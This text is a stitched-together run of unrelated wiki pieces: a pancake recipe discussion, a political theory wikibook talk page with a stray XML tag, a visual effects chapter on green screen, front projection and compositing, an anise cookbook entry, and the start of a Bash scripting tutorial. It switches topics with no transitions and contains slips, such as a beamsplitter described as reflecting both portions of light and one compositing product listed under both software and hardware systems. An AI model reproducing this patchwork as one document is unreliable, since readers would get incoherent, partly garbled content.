Thickness depends on elevation.  At sea level, this recipe will produce very thin pancakes; at 10,000 feet, the pancakes will be almost an inch thick. --[[User:67.185.172.158|67.185.172.158]] 05:33, 1 July 2006 (UTC)

== Ingredients ==

This recipe is close to the one I already had (pancakes aren't that complicated, after all), with a couple changes. First, I usually use honey instead of oil (butter and syrup are other alternatives, though untried by me). Also, I add a half-teaspoon of vanilla, and use(d) half the baking powder.

The sugar was a nice addition. I used this recipe's amount (of brown sugar) yesterday morning, then made another batch with 50% more, which I preferred. I often eat these as snacks, and syrup can be messy, so it's nice for the sweetness to be a little less subtle.

You can also sprinkle nuts on the pancakes just after pouring them, but this almost always causes an air bubble under the middle of the pancake when it's flipped, and that in turn makes even cooking more difficult.

All of this may make me sound like a cook, but I'm not. Pancakes are all I do. =)

I don't make pancakes too often, but cheese is a nice thing to add to pancakes. so I added it in the variety section.

      <text xml:space="preserve">In my opinion, it's a good idea not to jump into discussion of what the main categories of political systems are. What I'd personally advocate is starting with a classical theorist or two, like Plato, and looking at the roots of modern political thought, then maybe Hobbes/Locke, Rousseau, Marx, etc. Go through them in a sort of sequence so we can see how the theories developed, and then when it comes to describing them, the reader will have a knowledge both of intellectual history and of the modes of thought used to arrive at the conclusions that form today's forms of government.

-My own objections: first of all, this page is redundant -- for a less developed page http://en.wikibooks.org/wiki/Politicaltheory
-Second of all, a political theory book should not start with &quot;a classical theorist or two&quot;, rather theres a whole rich history of political theory, and most political Theory textbooks that I have read focus on the history, not on modern ideologies. If you want to write a book on Political Ideology, perhaps you should title it that. I might be wrong, this is my own experience. In short, the &quot;Introduction&quot; part of your textbook outline should be the most substantial part, most Political Theory courses focus on these canonical authors. I also would recommend inclusion of Old Testament, New Testament, and Middle Age political theorists such as Machiavelli, St Augustine (analog to Plato), and Thomas Aquinas to name a few. There are others that are necessary to cover as well such as the post-Aristotle Hellenic political philosophers (they can be covered briefly though). If you want to broaden this beyond western theory you can tackle Confucius among others, though I would vote against this. There can be another textbook called Eastern Political Theory. This is just touching on Ancient political theory. I am not even going to begin naming other &quot;classic&quot; authors that fill the modern period.
-I'm against putting emphasis on modern political ideologies. The above should illustrate why--there is not enough room to accomodate that without starving the historical theories. Make a political ideology textbook for that. Though I'm willing to hear arguments if you have convincing ones.

Possible objections:

1) It's too canonical. I actually agree with this: everyone at my university who studies politics goes through the usual Plato, Locke, Rousseau, Marx sequence. But at the same time, these thinkers are canon for a reason: they have been extremely influential and a lot of people - important people - have taken their thought to heart. If this sounds like an argument from authority or popularity, that's because it sort of is. But at the same time, we assume anyone doing a &quot;University&quot; course - particularly an open one such as this - will be of the questioning persuasion. After they have learned the basics, students will not be scared of questioning thought. Additionally, we can balance out any description of these thinkers with objections and dissenters from both their contemporary and our present-day sources.

2) It marginalises other thinkers, even those who stated the same conclusions but arrived at them differently. I suppose this is a bit of a restatement of the original question, and as such the solutions are the same. Balance out the &quot;canon&quot; with a heretical tradition. Show that the the tradition of political thought is

3) It's ethnocentric. It's white, it's European, it's Anglo. Fair enough objection here: but I don't think I'm wrong in saying that most &quot;politics&quot; DOES stem from those civilisations influenced by Greco-Roman tradition. Once again, we can offer alternative explanations and objections to what is taught (e.g. modern-day Islamic objections to individualist politics; Singaporean objections to liberal democracy; when discussing Locke, cite present day objections not only to his theory of consent, but also his limits of political action to a few, thus invalidating the idea of universal consent.)

:I've separated out the procedures of government from the ideologies of government.  I'll contribute more when i'm teaching this again in second summer.  Keeping clear, distinct and easily interpretable categories, will get us much farther, than mixing them.  --[[User:Buridan|Buridan]] 13:42, 15 May 2005 (UTC)

== removed feminism ==

while it may be an ideology, it is more social than political.  It will be covered later. --[[User:Buridan|Buridan]] 13:44, 15 May 2005 (UTC)

== democracy and republic ==
aren't they close to the same thing?
--[[User:OMouse|OMouse]]

:: Not really, a true democracy is self-representation, a republic is appointed or elected representation.  In aristotelian terms, there are three forms of government, kingship, aristocracy, and democracy.  rule by the one, rule by the few, and rule by the many.  In the tripartite division that i posted, i used republic for the the 'rule of the few' category, and when it is filled in over time, that will be expanded upon.    --[[User:Buridan|Buridan]] 16:45, 15 May 2005 (UTC)

== 9 ideologies ==

It says there are 9 main ideologies but unless I can't count, there's only 8? [[User:Sars|Sars]] 17:57, 19 August 2005 (UTC)

Feminism was removed as was another ideology (unless I'm mistaken) and someone just forgot to change that number. Thanks for pointing that out. [[User:OMouse|OMouse]] 19 August 2005

== Added Environmentalism ==

There are 9 now. I added environmentalism, for the reasons noted in the text. Am new to wikis, and apologise if I've not followed any shared protocols in what I've added today to the Political Theories. [[User:Wwwendos|Wwwendos]]

== Question ==
Hi there, my name is Martin M. Elissetche. I'm a PhD student at the University of Maryland and the creator of a social science dictionary located at www.socialsciencedictionry.org. I wanted to know if I could place a copy of your book on my web site or whether you prefer if I just link to it. Please let me know what you think at info@socialsciencedictionary.org. Cheers, m.

: A link will promote contribution to the book (but you can indeed post a copy in it and provide the link at the same time)  --[[User:Panic2k4|Panic]] ([[User talk:Panic2k4|talk]]) 06:18, 26 April 2010 (UTC)

== Merge ==
Since no one is opposing or acting to complete the merge. If no objection is raised I'll start merging the works in 7 days.  --[[User:Panic2k4|Panic]] ([[User talk:Panic2k4|talk]]) 06:22, 26 April 2010 (UTC)

:Merge complete, I did a minor reshuffle of the sections but a major restructure of the book is in order. The original structure of the Political Theory (stub, since there isn't enough content to call it a book yet) wasn't chronologically oriented, and it should because it would become more easy to fallow the evolution of the political theory the impact different policies had on society and the people that arouse of said society with new ideas...  --[[User:Panic2k4|Panic]] ([[User talk:Panic2k4|talk]]) 02:44, 1 May 2010 (UTC)</text>

''Note that this page covers Visual Effects and not Special Effects.  SFX are things like pyrotechnics, rain and snow. Visual Effects (VFX) are the optical tricks that are used, including projection, green-screen, miniatures, etc...''

Visual Effects have always existed; they somewhat pre-existed Cinema.
Cinema itself, based on the illusion of movement, is an Effect. Every second of projection is an illusion of movement, a lie told by the director to the audience, a mandatory preface that brings us to the practical aspects of visual effects.
It is not possible to ignore the revolution in the field brought by the employment of digital software.
The digital tools today replace a lot of arts in the past based just on human skills.

== Visual Effects are at the core of the movie making process. ==

If you cannot get a special effect in the camera, then you must create the visual effect in post production.  With major motion pictures, each shot can cost thousands of dollars.  But for low budget film makers, there are cheaper alternatives.

Do you want to start doing amazing special effects with your small  DV Camcorder?  Then you have at least two options:  Matte Paintings and Budget Green Screen Shooting.

== Budget Green Screen Shooting ==

Green screen is one way of adding beautiful backgrounds to live action shots.  Probably the most extreme example of this is Robert Rodrigues' ''Shark Boy and Lava Girl''.  But even if you are shooting with only a DV camcorder, you can do inexpensive green screen shots.

One can cut the cost of the shot substantially by doing your green screen shooting outdoors using a thermonuclear device (the sun) which is free (on sunny days). This means that all you have to hire is the green screen itself - none of the finely calibrated even lighting that's normally so essential for the computer to get a good key on the other end. 

As an alternative to purchase or rental, one can manufacture a green screen. Commercial lighting supply houses sell paints specially manufactured for the purpose, but it is probably possible to get by with an ordinary house paint chosen carefully to be &quot;green enough&quot; for the computer to pull a key.

The most common difficulties with green-screen are:

* getting even lighting on the screen.
* getting the lighting on the foreground to match the lighting of the (separately shot) background. 

By shooting outside, with a diffusion frame hung over the shot you will get naturally even sun-light all over the screen and actor. This will also match the daylight conditions of the background that later replaces the green. If your intended background is not going to be normal daylight, or if you get a lot of cloud movement, this may not work for you.

Make sure your foreground actor is a good distance from the screen, so you don't get even a hint of green light reflected back onto him/her, as this will create problems later - but with your light source being the sun (overhead), you're less likely to get green spill than if the lights were hitting the screen from the front, as they probably would in a studio.

==Front Projection==

Front Projection (often abbreviated FP) is a technique which can achieve the same result as green screen, but &quot;in camera,&quot; that is to say, the composition of subject and background is complete as the combined image is acquired by the camera. 

The technique uses a beamsplitter located in front of the camera in such a way as to completely fill the camera's field of view, and oriented at a precise 45 degrees to the camera's shooting axis. (This rotation from the normal may be left-right or up-down.) The other components to the system are a transparency projector (still or motion picture), and a special retro-reflective lenticular screen positioned behind the action.

A beamsplitter acts as both mirror and window, reflecting a portion of the incident light, and reflecting another portion. Beamsplitters are chosen for a specific application based on the ratio of reflectance to transmission. Common types are 50R/50T (50% reflectance, 50% transmission) and 70R/30T. 

The beamsplitters used in Front Projection cinematography are of the plate type, simply a piece of plate glass with a special coating on one side designed to reduce the amount of light absorbed by the beamsplitter, and consequently neither reflected nor transmitted. The coated side faces the action, and is referred to as the &quot;front&quot; surface. The purpose of this coating is to reduce the loss of light due to absorption by the beamsplitter, which serves only to heat the glass.

A retroreflective screen is set behind the actors and other set pieces. This screen is not just a typical diffusive projection screen, which disperses light evenly so that a large audience composed of people sitting at many different angles to the screen sees a uniformly bright image. Instead, the retroreflective screen tends to send light right back where it came from.

The classic material for retroreflective FP screens is a made by 3M, and sold under the trademarked name of &quot;Scotchlite&quot;. Scotchlite is used in signmaking and conspicuity applications (night time motor vehicle safety visibility). It is available from commercial signmaking supply houses. 

Retroreflection in Scotchlite is achieved using millions of microscopic glass beads suspended in a transparent substrate bound to opaque vinyl sheeting. It is available in rolls of up to four feet in width.

While constructing the large (40 feet by 100 feet) screen of Scotchlite for the film &lt;em&gt;2001: A Space Odyssey&lt;/em&gt;, director Stanley Kubrick and special effects supervisor Tom Howard initially laid strips of Scotchlite side by side, but found that variations in manufacturing made the seams between adjacent strips glaringly obvious in the final product. Their solution involved tearing the Scotchlite into irregular overlapping pieces, minimizing the occurrence of variations of retroreflectivity large and regular enough to be discernible to the audience. Still, as Martin Hart has observed, careful examination of the FP scenes of &lt;em&gt;2001&lt;/em&gt; reveal flaws introduced by variations in retroreflectivity between adjacent random patches. 

A more sophisticated solution was presented in an SMTPE paper: a review of this paper will be presented in a near future version of this article.

Having discussed the nature of the physical components used in Front Projection, we turn to the preparation and arrangement of these components in a working FP system.

A still or motion picture transparency projector containing the desired background image, or &quot;plate,&quot; is placed so that the projection axis is perpendicular to the camera's shooting axis, meeting at the place where the camera's shooting axis touches the front surface of the beamsplitter. (Thus the beamsplitter's orientation is 45 degrees to both camera and projector.)

When the projector is operating, the background plate is projected onto the front surface of the beamsplitter. A portion of the image is transmitted through the beamsplitter. In ordinary applications, the transmitted part of the image is absorbed by a black surface on the side of the beamsplitter opposite the projector, to avoid stray reflections.

The portion of the image which is not transmitted or absorbed by the beamsplitter is reflected through an angle of 90 degrees, and consequently projected over the action along the camera's shooting axis, falling onto both foreground actors and objects as well as the retroreflective screen behind them. 

Retroreflective materials tend to reflect light back along the path of incidence. In FP work, the background plate image is retroreflected, back toward the beamsplitter. Part of the retroreflected background image is again lost, as it is either absorbed by the beamsplitter or reflected back into the projection lens. The remainder enters the camera where it is photographed along with the action. 

The only portion of the image not accounted for in the foregoing discussion is that part of the projected background matte which falls on the actors or other foreground subjects. Foreground lighting, combined with the extreme deficit in retroreflectivity of the foreground subjects in comparison to the special screen, mean that the part of the projected image which falls on the actors is so dim as to not be detectable in-camera.

Precise alignment of system components is required to make sure that foreground objects perfectly cover their own shadows, cast by the projector on the screen. This rules panning and tilting, except in the special case where the camera is mounted so that either panning, tilting, or both occurs around the rear nodal point of the camera lens: so called &quot;nodal pans&quot; and &quot;nodal tilts.&quot; In addition, the beamsplitter must be large enough, and the camera close enough, so that the camera does not take the edge of the beamsplitter into view.

Examples of nodal pan-and-tilt camera work in the context of FP can be seen in the &quot;Dawn of Man&quot; sequence in the film &lt;em&gt;2001: A Space Odyssey&lt;/em&gt; (1968), particularly the watering hole scenes. (The front projection effects on &lt;em&gt;2001&lt;/em&gt; were executed by Stanley Kubrick with assistance from Tom Howard.)

A change of focal length (zoom) does not present the same difficulty as do panning or tilting. The camera can zoom in or out as long as the edges of the beamsplitter (or of the projected matte image) are not in view at the widest point of the zoom. In &lt;em&gt;2001&lt;/em&gt;, Kubrick also used large set pieces at either end of some FP shots in such a way as to hide the edges of his already-gigantic retroreflective screen.

In fact, a special and inventive application of zooming was used by Zoran Perisic, who worked as a rostrum or animation stand cameraman on &lt;em&gt;2001&lt;/em&gt;, to enhance the FP process for the film &lt;em&gt;Superman: The Movie&lt;/em&gt; (1978). Electronically controlled motorized zoom lenses are placed on both camera and projector, and synchronized with one another so that both lenses zoom together and at the same focal length at all times. This means that the background image will not change its apparent size when the camera zooms in, as the projector simultaneously projects a reduced image. In Persic's phrase, the projector zooms and the camera zooms to &quot;embrace&quot; the smaller image. However, the zoom causes foreground objects to appear to rush toward or away from the camera. The combination of the &quot;static&quot; background and the &quot;moving&quot; foreground enabled the visually effective flying scenes which helped to make the film a success.

To enhance this effect still further, the use of FP in &lt;em&gt;Superman&lt;/em&gt; introduced two other innovations: use of travelling mattes (using a motion picture projector instead of a still transparency projector, in order to project a moving background); and the mounting of the entire front projection rig (camera, projector, and beamsplitter) on a large motion-controlled robotic-arm with six degrees of freedom, and using a massive curved screen.

In rear projection process photography the projector's shutter must be synchronized with the camera's using mechanical or electronic means, in order to avoid background flicker.

The motion-controlled front-projection mount was a masterpiece of engineering for 1978, and used an early microprocessor for control. Every aspect of the rig's operation and motion could be recorded to computer tape for later automatic playback, causing the rig to move and operate exactly as trained.

==Matte Paintings==

The oldest and probably the most underrated visual effect is matte paintings.  We see these all the time but because they look so natural, we don't notice. 

Originally, matte paintings was done on glass that stood directly in front of the camera.  To do matte painting, a partial set is created which is only as big as the actors and only extends to where the actors will perform.  The rest of the movie set is empty space (or something that you don't want to be seen in the movie.)  Except for a tiny spot of the glass which is clear, the rest of the movie set is painting on the glass.  This allows you to add more scenery buildings as paintings.  As long as the actors can be seen through the clear space of the glass, you cannot tell that the actors are not apart of the painted movie set.

Today, matte paintings are done with both paint and with CG (computer generated visual effects).  Rather than filmed through glass, the actors are filmed normally and later composited into the matte painting.  Therefore, now the distinction between matte paintings and computer generated visual effects is blurred.   If the actors are filmed on a partial movie set (without any green screen, etc.) then the effect is a matte painting... even if you use computer generated effects to get the effect.

=3D Animation for Visual Effects=

When you start looking at the possibility of using 3D computer generated effects, you need understand the different types of 3D animation.

;1.  General Purpose Animation
:Programs such as Blender, LightWave, Maya, and 3D Studio Max are general purpose animation programs.  They are very powerful, expensive (except Blender, free), have steep learning curves and are used on most high end effects movies.

;2.  Special Purpose Animation Programs
:Program such as Vue, Bryce, Poser, and DAZ Studio are designed for a specific purpose.  Vue and Bryce are designed to create realistic scenery from nature.  Poser and DAZ Studio are designed to work with special computer models called '''Poser''' figures or '''Digital Puppets'''.  Some of these programs are even '''free''' such as DAZ Studio, Blender and Bryce.

;3.  Special software Plug-ins
:Software modules such as Character Studio work inside of a general purpose animation program to create a special kind of animation similar to a Special Purpose Animation Program.   LightWave, Maya, and 3D Studio Max can be greatly expanded through the use of plug-in modules.

;4. Support Programs
:Programs that add in the animation but do not actually do any rendering can be extremely useful when you have a general purpose animation program which would be more awkward to use for a special task.  These expand the power of  LightWave, Maya, and 3D Studio Max without making these programs too cumbersome.

==3D Modeling==

All elements in 3D animation must be modeled.  Programs such as  LightWave, Maya, XSI and 3D Studio Max come with a modeler module built in.  Programs such as Vue, Bryce, Poser, and DAZ Studio do not but in the case of Poser and DAZ Studio, you can buy hundreds of figures designed for these programs.
Pixologic Zbrush, and Autodesk Mudbox are especially good at modeling organic objects such as humans and creatures.

==3D Animation==

Animation is done in three parts, the modeling, the actual animation and the rendering.  The actual animation can be:

;1. Keyframe animation
:Each movement is entered into the computer system by noting the position of objects at specific frames or points in time.  The movement between these key points is then calculated by the animation program based on rules set up by the animator (straight line, curved, etc.)

;2. Programmed animation
:For a flock of birds, rather than record the position and movement of each bird, a computer program calculates where all the birds go and how they move.

=Compositing=

Compositing is the process of combining various elements, such as 3D imagery, live action film footage and still imagery, to create a finished shot.  All visual effects that include live actors will require compositing.  As mentioned above, matte paintings are no longer painted onto glass.  Rather the live action is composited with matte paintings using a compositing program such as Adobe After Effects or Apple's Shake.

'''Software Compositing Applications'''
*Apple Shake (Discontinued)
*Adobe After Effects
*Autodesk Combustion
*Blender
*The Foundry Nuke
*Eyeon Digital Fusion
*Jahshaka
*sony vegas pro
'''Software &amp; Hardware Compositing Systems'''
*Autodesk Inferno
*Autodesk Flame
*Autodesk Flint
*sony vegas pro
All compositing applications provide the same basic tools and there is no hard and fast rule regarding which applications are for film and which applications are for commercials.  For example, while After Effects has been used on such films as &quot;The Aviator&quot; it is also very widely used for broadcast and title design.  Some applications do, however, come with specific tools which may prove advantageous depending on the task at hand.

The primary difference between software based compositing applications and the combined software and hardware solutions is that the large Autodesk systems are significantly more expensive but provide near real-time performance at film or HD resolutions.

Compositing applications typically follow two different working paradigms.
*Layer Based
*Node Based

Layer based compositing applications may seem more easily approachable to the novice or beginner compositor especially those who have worked with still footage in Photoshop or The Gimp.  While layer based applications can provide the same results as node based applications, node based applications are far easier to composite with when dealing with numerous elements and multiple 3D render passes.  While daunting at first, node based systems may provide the compositor with greater control over the shot and easier problem solving.  Even a beginning artist may benefit from learning a node based package in that she will gain a deep understanding of the exact operations which are taking place in order to create the effect.

== 8-Bit Graphics ==
Every pixel of an image used in a composite is composed of four color channels: Red, Green, Blue and Alpha. Each channel has an 8-Bit color depth resulting in a 32-Bit image. Higher color depths include 16-Bit per channel and 32-Bit per channel (float).  These higher color depths allow for smoother display of color variation, for example, in gradients.

== Rotoscoping ==
Rotoscoping, or masking, is the basis of compositing. It is the process of drawing a mask around an element in a frame or sequence of frames.  The resulting image is a combination of the Red, Green and Blue color channels in addition  to an Alpha channel which defines transparency.it works on frame to frame, you can not ignore a single frame which is not perfectly mask.

== Tracking ==
Tracking is the process of matching a foreground-element's motion to that of the background. Basically you pick a decent (i.e. defined, unique, contrasty) point on your background and tell the computer to follow that point. What you get is the motion-path of your point, which you can then apply to your foreground.&lt;p&gt;
Tracking is divided into two categories:&lt;br&gt;
'''2D Tracking:'''&lt;br&gt;
Described above... (most times referred to only as &quot;tracking&quot;, almost all compositing applications support it)&lt;br&gt;
'''3D Tracking:'''&lt;br&gt;
3D Tracking attempts to &quot;solve&quot; or derive spatial relationships between points you tracked in 2D space and approximate the distance and parallax between these points in 3D space through the use of complex photogrammetry algorithms. The end result is an approximation of the motion of the camera used to film the scene that can be exported to a 3D application or 2D application to aid in the process of matchmoving.  Shots which track most effectively tend to be those with a constant camera path and a significant amount of parallax.&lt;br&gt;
Many compositing applications can handle 3D tracking data with varying degrees of proficiency.

'''Anise''' is both a [[Cookbook:Vegetable|vegetable]] and a [[Cookbook:Spice|spice]].

As a spice, the dried seeds are ground for use. Anise smells somewhat like [[Cookbook:Star Anise|star anise]], [[Cookbook:Fennel|fennel]] and [[Cookbook:Liquorice|liquorice]]. Anise is a strong spice, so use it sparingly. A few seeds, perhaps 10 at most, will improve the flavor of [[Cookbook:Pizza Sauce|pizza sauce]].

As a vegetable, the stalks are used. A typical use would be [[Cookbook:Stir-frying|stir-fry]].

The finely divided leaves can also be used to flavor a dish.

==Introduction==

===What is Bash?===

'''[[w:Bash (Unix shell)|Bash]]''' is a &quot;Unix shell&quot;: a command-line interface for interacting with the operating system. It is widely available, being the default shell on many GNU/Linux distributions and on Mac OS X; and ports exist for many other systems. It was created in the late 1980s by a programmer named Brian Fox, working for the Free Software Foundation. It was intended as a free-software alternative to the Bourne shell (in fact, its name is an acronym for &quot;Bourne-again shell&quot;), and it incorporates all features of that shell, as well as new features such as integer arithmetic and in-process regular expressions.

===What is shell scripting?===

In addition to the interactive mode, where the user types one command at a time, with immediate execution and feedback, Bash (like many other shells) also has the ability to run an entire script of commands, known as a &quot;Bash shell script&quot; (or &quot;Bash script&quot; or &quot;shell script&quot; or just &quot;script&quot;). A script might contain just a very simple list of commands — or even just a single command — or it might contain functions, loops, conditional constructs, and all the other hallmarks of imperative programming. In effect, a Bash shell script is a computer program written in the Bash programming language.

Shell scripting is the art of creating and maintaining such scripts.

Shell scripts can be called from the interactive command-line described above; or, they can be called from other parts of the system. One script might be set to run when the system boots up; another might be set to run every weekday at 2:30 AM; another might run whenever a user logs into the system.

Shell scripts are commonly used for many system administration tasks, such as performing disk backups, evaluating system logs, and so on. They are also commonly used as installation scripts for complex programs. They are particularly suited to all of these because they ''allow'' complexity without ''requiring'' it: if a script just needs to run two external programs, then it can be a two-line script, and if it needs all the power and decision-making ability of a Turing-complete imperative programming language, then it can have that as well.

===How to read this book===

You will probably find this book most useful if you have a Bash command-line open in another window as you are going through it. You may want to try out some of the examples; but more important is to try things out that ''aren't'' just copied from the book. If you think something probably works a certain way, test out your expectations! Except where noted otherwise, the examples in this book do not require any special privileges or permissions, and do not require any software aside from Bash itself and very common utilities that are generally found on any system where Bash is. (If you are on a Windows system, and don't have SSH access to a GNU/Linux or Unix system, you will probably find it easiest to make use of this book if you are using something like Cygwin, which has not only Bash but also many other common utilities, than if you are using a Bash port for Windows that includes ''only'' Bash. If you have Cygwin, just make sure that the directory containing those utilities — likely something like &lt;tt&gt;C:\Cygwin\bin&lt;/tt&gt; — is listed in your Windows path.)

When you are experimenting, you will likely find it helpful to consult the documentation for various commands. For commands that are built into Bash, you can use the built-in &lt;tt&gt;help&lt;/tt&gt; command; for example, &lt;source lang=&quot;bash&quot; enclose=&quot;none&quot;&gt;help echo&lt;/source&gt; will &quot;print&quot; (that is, display) information about the built-in &lt;tt&gt;echo&lt;/tt&gt; command. For external programs, it is likely that their manual pages are installed on your system, in which case you can view them via the &lt;tt&gt;man&lt;/tt&gt; (&quot;manual&quot;) command; for example, for information about the &lt;tt&gt;cp&lt;/tt&gt; (&quot;copy&quot;) command, you can type &lt;source lang=&quot;bash&quot; enclose=&quot;none&quot;&gt;man cp&lt;/source&gt;. Additionally, most programs, when run with the argument &lt;tt&gt;--help&lt;/tt&gt;, will print some help information; for example, &lt;source lang=&quot;bash&quot; enclose=&quot;none&quot;&gt;cp --help&lt;/source&gt; gives almost as much information as &lt;source lang=&quot;bash&quot; enclose=&quot;none&quot;&gt;man cp&lt;/source&gt;. (With many programs, however, the &lt;tt&gt;--help&lt;/tt&gt; approach does not give anywhere near as much information as the &lt;tt&gt;man&lt;/tt&gt; approach.)

A word of caution: this book is part of a wiki, which means that anyone may have edited it. It is possible — unlikely, but possible — that someone has added an &quot;example&quot; that is actually malicious code, or inserted malicious code into an existing example. Trust your instincts; if an example seems suspicious to you, if the surrounding text doesn't adequately explain what it does, if it doesn't seem to match the description in the surrounding text, then ''don't run it''. And even if it's clear that an example is non-malicious, it's a good idea to run all of your experiments using an account that has no special privileges or permissions on the system, so you don't (say) accidentally delete something important. Bash is a very powerful systems administration tool, which sometimes means it's a powerful way to accidentally cripple your system!

If you are completely new to Bash, or if you have some experience with the Bash command-line but are completely new to programming, you will probably find this book most useful if you begin at the beginning, and work your way through in linear order. If the topic of any section is completely familiar to you, you might want to skim it quickly for possible surprises, rather than skipping it completely; after all, you may not know what you may not know.

If you already have some Bash experience and some programming experience, you can probably skim the entire first half of the book, focusing only on examples that show Bash syntax you aren't already familiar with. That done, you should be in a good position to get the most out of the second half of the book.

If you already have a lot of Bash shell-scripting experience, this may not be the book for you; you will probably learn some things, but not as much as you would learn from the Bash Reference Manual on the Free Software Foundation's web-site, or simply from reading the entirety of &lt;tt&gt;man bash&lt;/tt&gt;. (But this being a wiki, you are invited to share the fruits of your experience!) This book is not a comprehensive reference manual; it focuses on techniques that are either widely used or widely useful, and mostly assumes a typical setup rather than exhaustively documenting all the unusual features that can affect the behavior of a command.

===A few notes on terminology===

The language of Bash commands is a Turing-complete programming language, meaning that if it is even theoretically possible for a given computation to be performed, then it is theoretically possible to perform it in Bash. Furthermore, from a practical standpoint, it is possible to do some very sophisticated things in Bash, and people often do. Nonetheless, it is usually described as a &quot;shell-scripting language&quot; (or similar) rather than a &quot;programming language&quot;, and the programs written in it are usually referred to as &quot;Bash shell scripts&quot; (or similar) rather than &quot;Bash programs&quot;. We will follow that convention here, preferring '''script''' for a Bash script and '''program''' only when referring to external programs that might be invoked from a Bash script.

We will also often use the term '''utility'''. This term is somewhat subjective, and usage varies, but it typically describes an external program that requires no human interaction and is intended to work well with other programs. All utilities are programs, so we will use the terms somewhat interchangeably. The extreme opposite of a &quot;utility&quot; is an '''application'''; that term is also subjective, with variable usage, but it typically describes an external program that has a relatively complex graphical user interface (GUI) and is not intended to work well with other programs. Since applications, by their nature, are not generally called from Bash scripts, we will have less occasion to use that term. Many programs are neither &quot;utilities&quot; nor &quot;applications&quot;, and some programs have elements both of utilities and of applications.

Of the various elements of a Bash script, some are typically called '''commands''', while others are typically called '''statements'''. We will observe this distinction here, but you need not overly concern yourself with it. Normally &quot;command&quot; is used in reference to invocations of external programs, of Bash built-ins such as &lt;tt&gt;echo&lt;/tt&gt; that resemble external programs, of shell functions (which we will see below), and so on. Normally &quot;statement&quot; is used in reference to instances of Bash programming constructs such as &lt;tt&gt;if … then … else … fi&lt;/tt&gt; or variable assignment (which we will see shortly). Perhaps confusingly, '''command''' is also used in reference to any Bash built-in, even if a use of that built-in would result in a &quot;statement&quot; rather than a &quot;command&quot;; for example, &quot;an &lt;tt&gt;if&lt;/tt&gt; statement&quot; is a statement that uses &quot;the &lt;tt&gt;if&lt;/tt&gt; command&quot;. If this distinction seems too fine, do not worry; in context, it should always be sufficiently clear what is meant by one term or the other.

==Some introductory examples==

Let's start with a simple &quot;hello world&quot; program:

&lt;source lang=&quot;bash&quot;&gt;
echo 'Hello, world!'
&lt;/source&gt;

We can either type this directly at the Bash prompt, or else save this as a file (say, &lt;tt&gt;hello_world.sh&lt;/tt&gt;) and run it by typing &lt;tt&gt;bash hello_world.sh&lt;/tt&gt; at the Bash prompt. (Later we will see some more sophisticated ways to create and run a Bash script file.) In either case, it will print &lt;tt&gt;Hello, world!&lt;/tt&gt;:

 $ &lt;source lang=&quot;bash&quot; enclose=&quot;none&quot;&gt;echo 'Hello, world!'&lt;/source&gt;
 Hello, world!

Here we have used the &lt;tt&gt;$&lt;/tt&gt; symbol to indicate the Bash prompt: after &lt;tt&gt;$&lt;/tt&gt;, the rest of the line shows the command that we typed, and the following line shows the output of the command.

Here is a slightly more complex script:

&lt;source lang=&quot;bash&quot;&gt;
if [[ -e readme.txt ]] ; then
  echo 'The file &quot;readme.txt&quot; exists.'
else
  echo 'The file &quot;readme.txt&quot; does not exist.'
fi
&lt;/source&gt;

This script tests whether there exists a file named &lt;tt&gt;readme.txt&lt;/tt&gt; in the current directory, and uses an &lt;tt&gt;if&lt;/tt&gt; statement to control, based on that test, which commands are run. It, too, could be typed directly at the prompt — any script can — but in this case that is not likely to be useful.

Both of the above are entirely &quot;within Bash&quot;, in that they do not require Bash to run any external programs. (The commands &lt;tt&gt;echo&lt;/tt&gt;, &lt;tt&gt;if … then … else … fi&lt;/tt&gt;, and &lt;tt&gt;[[&lt;nowiki/&gt; -e … ]]&lt;/tt&gt; are all built-in commands, implemented by Bash itself.) But, being a shell-scripting language, a large part of Bash's purpose is to run external programs. The following script demonstrates this ability:

&lt;source lang=&quot;bash&quot;&gt;
if [[ -e config.txt ]] ; then
  echo 'The file &quot;config.txt&quot; already exists. Comparing with default . . .'
  diff -u config-default.txt config.txt &gt; config-diff.txt
  echo 'A diff has been written to &quot;config-diff.txt&quot;.'
else
  echo 'The file &quot;config.txt&quot; does not exist. Copying default . . .'
  cp config-default.txt config.txt
  echo '. . . done.'
fi
&lt;/source&gt;

Here &lt;tt&gt;diff&lt;/tt&gt; and &lt;tt&gt;cp&lt;/tt&gt; are two common utility programs that, while not part of Bash, are found on most systems that have Bash. The above script assumes the presence of a default configuration file named &lt;tt&gt;config-default.txt&lt;/tt&gt;, and checks for the presence of a configuration file named &lt;tt&gt;config.txt&lt;/tt&gt;. If &lt;tt&gt;config.txt&lt;/tt&gt; exists, then the script uses the external program &lt;tt&gt;diff&lt;/tt&gt; to produce a &quot;diff&quot; (a report of the differences between, in this case, two files), so that the user can see what non-default configurations are in place. If &lt;tt&gt;config.txt&lt;/tt&gt; does not exist, then the script uses the external program &lt;tt&gt;cp&lt;/tt&gt; (&quot;copy&quot;) to copy the default configuration file to &lt;tt&gt;config.txt&lt;/tt&gt;.

As you can see, the external programs are run using the same sort of syntax as the built-in commands; they're both just &quot;commands&quot;.

The above version of this script is very &quot;verbose&quot;, in that it generates a great deal of output. A more typical script would likely not include the &lt;tt&gt;echo&lt;/tt&gt; commands, since users are unlikely to need this level of information. In that case, we might use the &lt;tt&gt;#&lt;/tt&gt; notation to include comments that are completely ignored by Bash, and do not appear to the user. Such comments are simply informative notes for someone reading the script itself:

&lt;source lang=&quot;bash&quot;&gt;
if [[ -e config.txt ]] ; then
  # if config.txt exists:
  diff -u config-default.txt config.txt &gt; config-diff.txt # see what's changed
else
  # if config.txt does not exist:
  cp config-default.txt config.txt # take the default
fi
&lt;/source&gt;

But the above is simply for demonstration's sake. In reality, a script this simple does not require any comments at all.

==Simple commands==

A ''simple command'' consists of a sequence of ''words'' separated by spaces or tabs. The first word is taken to be the name of a command, and the remaining words are passed as ''arguments'' to the command. We have already seen a number of examples of simple commands; here are some more:

* &lt;source lang=&quot;bash&quot; enclose=&quot;none&quot;&gt;cd ..&lt;/source&gt;
** This command uses &lt;tt&gt;cd&lt;/tt&gt; (&quot;change directory&quot;; a built-in command for navigating through the filesystem) to navigate &quot;up&quot; one directory.
** The notation &lt;tt&gt;..&lt;/tt&gt; means &quot;parent directory&quot;. For example, &lt;tt&gt;/foo/bar/../baz.txt&lt;/tt&gt; is equivalent to &lt;tt&gt;/foo/baz.txt&lt;/tt&gt;.
* &lt;source lang=&quot;bash&quot; enclose=&quot;none&quot;&gt;rm foo.txt bar.txt baz.txt&lt;/source&gt;
